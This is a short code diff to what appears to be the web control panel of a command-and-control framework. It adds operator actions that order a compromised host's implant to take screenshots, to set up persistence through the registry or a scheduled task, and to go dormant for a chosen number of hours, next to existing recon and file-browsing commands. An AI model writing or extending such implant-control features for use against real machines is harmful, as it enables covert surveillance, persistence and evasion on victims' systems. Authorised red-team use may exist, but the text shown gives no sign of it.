@@ -407,6 +407,17 @@
                 case 'recon':
                     await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'recon' });
                     break;
+                case 'screenshot':
+                    await api('POST', '/agents/' + selectedAgentId + '/postex', { op: 'screenshot' });
+                    break;
+                case 'persist':
+                    var persistMethod = prompt('Persistence method (reg, schtask, remove):', 'reg');
+                    if (persistMethod) await api('POST', '/agents/' + selectedAgentId + '/persist', { method: persistMethod });
+                    break;
+                case 'dormant':
+                    var dormantHours = prompt('Go dormant for how many hours?', '8');
+                    if (dormantHours) await api('POST', '/agents/' + selectedAgentId + '/dormant', { duration: dormantHours });
+                    break;
                 case 'files':
                     openConsole(selectedAgentId);
                     listFiles(selectedAgentId);
